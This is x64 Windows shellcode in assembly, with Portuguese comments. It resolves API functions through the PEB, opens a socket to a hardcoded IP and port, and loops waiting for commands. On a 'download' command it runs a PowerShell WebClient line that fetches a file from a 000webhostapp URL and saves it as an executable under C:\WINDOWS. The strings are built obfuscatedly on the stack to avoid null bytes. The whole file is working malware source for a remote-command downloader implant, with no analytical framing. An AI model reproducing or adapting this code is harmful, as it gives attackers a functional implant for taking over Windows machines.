;*************
;By: Teuzero *
;*************

[BITS 64]
global WinMain

section .text

WinMain:
    start:
        add rsp, 0xfffffffffffffdf8; # Avoid Null Byte
        ; Obtem o endereço base do kernel32.dll 
        call Locate_kernel32

        ; Código para chegar na tabela de endereco de exportacao
        mov ebx, [rbx+0x3C];  # obtem o endereco da assinatura do  PE do Kernel32 e coloca em  EBX
        add rbx, r8;          # Add defrerenced signature offset to kernel32 base. Store in RBX.
        mov r12, 0x88FFFFF;      
        shr r12, 0x14; 
        mov edx, [rbx+r12];   # Offset from PE32 Signature to Export Address Table (NULL BYTE)
        add rdx, r8;          # RDX = kernel32.dll + RVA ExportTable = ExportTable Address
        mov r10d, [rdx+0x14]; # numero de funcoes
        xor r11, r11;         # Zera R11 para ser usado 
        mov r11d, [rdx+0x20]; # AddressOfNames RVA
        add r11, r8;          # AddressOfNames VMA

         ; Percorra a tabela de endereços de exportação para encontrar o nome GetProcAddress
        mov rcx, r10;                        # Set loop counter
        kernel32findfunction:  
                jecxz FunctionNameFound;     # Percorra esta função até encontrarmos GetProcA
                xor ebx,ebx;                 # Zera EBX para ser usada
                mov ebx, [r11+4+rcx*4];      # EBX = RVA para o primeiro AddressOfName
                add rbx, r8;                 # RBX = Nome da funcao VMA
                dec rcx;                     # Decrementa o loop em 1
                mov rax, 0x41636f7250746547; # GetProcA
                cmp [rbx], rax;              # checa se rbx é igual a  GetProcA
                jnz kernel32findfunction;  
        
        ; Encontra o endereço da função de GetProcessAddress
        FunctionNameFound:                 
                ; We found our target
                xor r11, r11; 
                mov r11d, [rdx+0x24];   # AddressOfNameOrdinals RVA
                add r11, r8;            # AddressOfNameOrdinals VMA
                ; Get the function ordinal from AddressOfNameOrdinals
                inc rcx; 
                mov r13w, [r11+rcx*2];  # AddressOfNameOrdinals + Counter. RCX = counter
                ; Get function address from AddressOfFunctions
                xor r11, r11; 
                mov r11d, [rdx+0x1c];   # AddressOfFunctions RVA
                add r11, r8;            # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
                mov eax, [r11+4+r13*4]; # Get the function RVA.
                add rax, r8;            # Add base address to function RVA
                mov r14, rax;           # GetProcAddress to R14
        
               ; pega o endereco LoadLibraryA usando GetProcAddress
                mov rcx, 0x41797261;  
                push rcx;  
                mov rcx, 0x7262694c64616f4c;  
                push rcx;  
                mov rdx, rsp;                      # joga o ponteiro da string LoadLibraryA para RDX
                mov rcx, r8;                       # Copia o endereço base da Kernel32  para RCX
                sub rsp, 0x30;                     # Make some room on the stack
                call r14;                          # Call GetProcessAddress
                add rsp, 0x30;                     # Remove espaço locdo na pilha
                add rsp, 0x10;                     # Remove a string alocada de  LoadLibrary 
                mov rsi, rax;                      # Guarda o endereço de loadlibrary em RSI


        ; Call LoadLibraryA on WS2_32.DLL 
                xor rax, rax; 
                mov rax, 0x6C6C;                   # ll
                push rax; 
                mov rax, 0x642E32335F325357;       # WS2_32.d
                push rax; 
                mov rcx, rsp;                      # copy stack string to RCX
                sub rsp, 0x30; 
                call rsi;                          # Call LoadLibraryA
                mov r15, rax; 
                add rsp, 0x30;                     # Clean allocated space on stack
                add rsp, 0x10;                     # Clean space for ws2_32.dll
        
        LoopConnection:
        ; Lookup WSAStartup Address
                mov rax, 'up'
                push rax
                mov rax, 'WSAStart'
                push rax
                mov rdx, rsp;                      # WSAStartup into RDX
                mov rcx, r15;                      # Copy WS2_32 base address to RCX
                sub rsp, 0x30
                call r14;                          # Call GetProcessAddress
                add rsp, 0x30
                add rsp, 0x10;                     # Remove Allocated LoadLibrary string  
                mov r12, rax;                      # Save the address of WSAStartup in RSI
                nop
                nop
                nop
                nop
                nop
                nop
        ; Call WSAStartup
                xor rdx,rdx
                xor rcx,rcx
                mov ecx, 0x02020202;               # rcx = sizeof(struct WSAData)
                push rcx
                lea rdx,[rsp];                     # lpWSAData [out]
                mov ecx, 0x202;
                sub rsp, 0x30
                xor r10,r10
                push r10
                call r12;                          # Call WSAStartup
                add rsp,0x30
                add rsp, 0x10
        ; Lookup WSASocketA Address
                mov rax, 0x4174
                push rax
                mov rax, 0x656b636f53415357
                push rax
                mov rdx, rsp;                      # WSASocketA into RDX
                mov rcx, r15;                      # Copy WS2_32 base address to RCX
                sub rsp, 0x30;                     # Make some room on the stack
                call r14;                          # Call GetProcessAddress
                add rsp, 0x30;                     # Remove allocated stack space
                add rsp, 0x10;                     # Remove Allocated LoadLibrary string
                mov r12, rax;

        ; Create a socket with WSASocketA
                sub rsp,0x208; 
                xor rdx, rdx; 
                sub rsp, 0x58; 
                mov [rsp+0x20], rdx; 
                mov [rsp+0x28], rdx; 
                inc rdx
                mov rcx,rdx
                inc rcx
                xor r8,r8
                mov r8d, 0x06
                xor r9,r9
                mov edx, 0x01
                mov ecx, 2
                call r12; 
                mov r13, rax; 
                add rsp, 0x208; 

        ; Lookup WSAConnect Address
                sub rsp, 0x208
                mov rax, 0x7463; 
                push rax; 
                mov rax, 0x656e6e6f43415357; 
                push rax;                          # WSAConnect
                mov rdx, rsp;                      # WSAConnect into RDX
                mov rcx, r15;                      # Copy WS2_32 base address to RCX
                sub rsp, 0x30;                     # Make some room on the stack
                call r14;                          # Call GetProcessAddress
                add rsp, 0x208
                add rsp, 0x30;                     # Remove allocated stack space
                add rsp, 0x10;                     # Remove Allocated LoadLibrary string
                mov r12, rax;                      # Save the address of WSAConnect in R12  

        ; Call WSAConnect...
                mov rcx, r13;                      # Our socket handle as parameter 1
                sub rsp,0x208;                     # Make some room on the stack
                xor rax,rax
                mov rax,0x02
                mov [rsp], rax;                    # AF_INET = 2
                mov rax, 0xbb01;                   # PORT
                mov [rsp+2], rax;                  # PORT
                mov rax, 0xc000000a;               # IP
                mov [rsp+4],rax;                   # IP
                lea rdx,[rsp];                     # Save our pointer to RDX
                mov r8,0x10;                       # Move 0x10 namelen
                xor r9,r9      
                push r9;                           # NULL lpCallerData
                push r9;                           # NULL lpCallerData
                push r9;                           # NULL lpSQOS
                sub rsp, 0x88;                     # NULL lpSQOS
                call r12;                          # Call WSAConnect
                add rsp, 0x208
                add rsp, 0x88
                cmp eax,0xFFFFFFFF
                jz LoopConnection 


        ; Lookup memset
                call Locate_ntdll
                sub rsp, 0x208
                xor rax,rax
                mov rax, 'memset'
                push rax
                mov rdx, rsp
                mov rcx, r8
                sub rsp, 0x30
                call r14
                mov r12,rax
                add rsp, 0x30
        ; Call memset
                mov r8d, 0x400
                mov edx, 0
                sub rsp, 0x1000
                lea rcx, [rsp]
                call r12
                xor r8,r8
                lea r8, [rax] 
                add rsp, 0x1000
        ;Lookup recv
        LoopRecv:
                xor rcx,rcx
                xor rax,rax
                mov rax, 0x76636572FFFFFFFF
                shr rax,0x20
                push rax
                mov rdx,rsp
                mov rcx, r15 
                sub rsp, 0x30
                call r14 
                sub rsp, 0x30
                mov r12, rax

        
        ;Call recv
                mov rcx, r13
                xor r9,r9
                mov r8d, 0x400
                sub rsp, 0x1000
                lea rdx, [rsp]
                mov r10, 0x00
                push r10
                call r12
                add rsp, 0x08
                xor rdi,rdi
                xor rsi,rsi
        
        ;Look strcmp
                cmp eax,0xFFFFFFFF
                jne Continue
                jmp Loop
        
        Continue:        
                cmp al, 0x01
                jz LoopRecv
                cmp al, 0x02
                jz LoopRecv                
                mov rdi, rax
                call Locate_ntdll
                xor rbp, rbp
                mov rbp, 0x00

                ;loopcaractere:        
                ;        inc rbp
                ;        inc rsp
                ;        cmp rbp, 0x08 
                ;        jnz loopcaractere     
                mov rsi ,rsp

                call CaractereNull
                
                mov rbx, r8
                ; Lookup memcpy
                memcpy:
                        xor rax,rax
                        mov rax, 'memcpy'
                        push rax
                        mov rdx, rsp
                        mov rcx, r8
                        sub rsp, 0x30
                        call r14
                        add rsp, 0x30
                        mov r12,rax

                ; Call memcpy
                        mov rdx, rdi
                        mov r8, rdx
                        mov rdx, rsi
                        sub rsp, 0x2728
                        lea rcx, [rsp]
                        call r12
                        mov rdi, rax
                strcmp:
                ; Lookup strcmp
                        
                        mov rcx, rbx
                        xor rax,rax
                        mov rax, 'strcmp'
                        push rax
                        mov rdx, rsp
                        sub rsp, 0x30
                        call r14                                         
                        add rsp, 0x30
                        mov r12, rax

                ; Call strcmp
                        xor rax,rax
                        xor rcx,rcx
                        xor r8,r8
                        mov r8d, 0x00
                        mov rdx, rdi
                        mov rax, 'download'
                        push rax
                        mov [rsp+0x08], r8d
                        mov [rsp+0x09], r8d
                        mov rcx, rsp
                        mov r9, 0x00
                        push r9
                        call r12
                        add rsp, 0x2728
                        add rsp, 0x1000
                        add rsp, 0x08
                        cmp al,0
                        jnz LoopRcv
                
                ; Donwload 
                Download:
                        call Locate_kernel32
                        call LoadLibrary
                        mov r12, rsi
                        xor rax,rax
                        mov rax, 'll'
                        push rax
                        mov rax, 'msvcrt.d'
                        push rax
                        mov rcx, rsp
                        mov r10, 0x00
                        push r10
                        sub rsp, 0x30
                        call r12
                        add rsp, 0x30
                        xor rsi,rsi
                        mov rsi, rax
                ; Lookup system
                        mov rcx,rsi
                        xor rax,rax
                        mov rax, 'system'
                        push rax
                        lea rdx, [rsp]
                        sub rsp, 0x30
                        mov r8,0x00
                        push r8
                        call r14
                        add rsp, 0x30
                        mov r12, rax
                
                ; Call Download
                        mov rax, 0x22FFFFFFFFFFFFFF
                        shr rax, 0x38
                        push rax
                        mov rax, ')FFFFFFF'
                        shl rax, 0x38
                        push rax
                        mov rax, 0x27FFFFFFFFFFFFFF
                        shr rax, 0x38
                        mov [rsp+0x06], al
                        mov rax, 'strk.exe'
                        mov [rsp-0x02], rax
                        mov rax, 'NDOWS\nt'
                        push rax
                        mov rax, 'C:\WIfff'
                        shl rax, 0x18
                        push rax
                        mov rax, 0x27ffffffffffffff
                        shr rax, 0x38
                        mov [rsp+0x02], al
                        mov rax, 0x2cffffffffffffff
                        shr rax, 0x38
                        mov [rsp+0x01], al
                        mov rax, 0x27ffffffffffffff
                        shr rax, 0x38
                        mov [rsp+0x00], al
                        
                        mov rax, 'rate.txt'
                        push rax
                        mov rax, 'agens/pi'
                        push rax
                        mov rax, 'p.com/im'
                        push rax
                        mov rax, 'ebhostap'
                        push rax
                        mov rax, 'ies.000w'
                        push rax
                        mov rax, '/red-mov'
                        push rax
                        mov rax, 'https:/f'
                        shl rax, 0x08
                        push rax
                        mov rax, 0x27FFFFFFFFFFFFFF
                        shr rax, 0x38
                        mov [rsp-0x00], al
                        mov rax, 0x28ffffffffffffff
                        shr rax, 0x38
                        mov [rsp-0x01], al
                        
                        mov rax, 'loadFile'
                        mov [rsp-0x09], rax
                        mov rax, 'nt).Down'
                        mov [rsp-0x11], rax
                        mov rax, '.WebClie'
                        mov [rsp-0x19], rax
                        mov rax, 'stem.Net'
                        mov [rsp-0x21], rax
                        mov rax, 'bject Sy'
                        mov [rsp-0x29], rax
                        mov rax, 'offfffff'
                        shl rax, 0x38
                        mov [rsp-0x31], rax
                        mov rax, 0x2dffffffffffffff
                        shr rax, 0x38
                        mov [rsp-0x2b], al
                        mov rax, 'newfffff'
                        shl rax, 0x28
                        mov [rsp-0x33], rax

                        
                        mov rax, 0x28ffffffffffffff
                        shr rax, 0x38
                        mov [rsp-0x2f], al        


                        mov rax, 0x22ffffffffffffff
                        shr rax, 0x38
                        mov [rsp-0x30], al

                        mov rax, 'ell -c f'
                        shl rax, 0x08
                        mov [rsp-0x41+0x09], rax
                        mov rax, 'powershF'
                        shl rax, 0x08
                        mov [rsp-0x3f], rax
                        
                        xor rcx,rcx
                        lea rcx, [rsp-0x2c-0x12]
                        sub rsp, 0x80
                        sub rsp, 0x30
                        call r12
                        add rsp, 0x80
                        sub rsp, 0x80
                LoopRcv:
                ; LoopRecv
                        xor rcx,rcx
                        mov cl, 1
                        cmp cl, 1
                        jz LoopRecv
        ; Loop connection        
        Loop:
                xor rcx,rcx
                mov cl, 1
                cmp cl, 1
                jz LoopConnection

            ;locate_kernel32
        Locate_kernel32: 
                xor rcx, rcx;             # Zera RCX
                mov rax, gs:[rcx + 0x60]; # 0x060 ProcessEnvironmentBlock to RAX.
                mov rax, [rax + 0x18];    # 0x18  ProcessEnvironmentBlock.Ldr Offset
                mov rsi, [rax + 0x20];    # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
                lodsq;                    # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
                xchg rax, rsi;            # troca RAX,RSI
                lodsq;                    # Load qword at address (R)SI into RAX
                mov rbx, [rax + 0x20] ;   # RBX = Kernel32 base address
                mov r8, rbx;              # Copia o endereco base do Kernel32 para o registrador R8
                ret
        

        ;locate_ntdll
        Locate_ntdll:        
                xor rcx, rcx;             # Zera RCX
                mov rax, gs:[rcx + 0x60]; # 0x060 ProcessEnvironmentBlock to RAX.
                mov rax, [rax + 0x18];    # 0x18  ProcessEnvironmentBlock.Ldr Offset
                mov rsi, [rax + 0x30];    # 0x30 Offset = ProcessEnvironmentBlock.Ldr.InInitializationOrderModuleList
                mov rbx, [rsi +0x10];     # dll base ntdll
                mov r8, rbx;              # Copia o endereco base da ntdll para o registrador R8
        ret
        
        ; Caractere Nulo
        CaractereNull:
                xor rbx,rbx

                mov [rsp+rdi*0x02], bl
                mov [rsp+rdi*0x02+0x01], bl
        ret                                      

        LoadLibrary:        
                mov rcx, 0x41797261;  
                push rcx;  
                mov rcx, 0x7262694c64616f4c;  
                push rcx;  
                mov rdx, rsp;   # joga o ponteiro de LoadLibraryA para RDX
                mov rcx, r8;    # Copia endereco base do Kernel32 para RCX
                sub rsp, 0x30;  # Make some room on the stack
                call r14;       # Call GetProcessAddress
                add rsp, 0x30;  # Remove espaço alocado na pilha
                add rsp, 0x10;  # Remove a string LoadLibrary alocada 
                mov rsi, rax;   # Guarda o endereço de loadlibrary em RSI
        ret
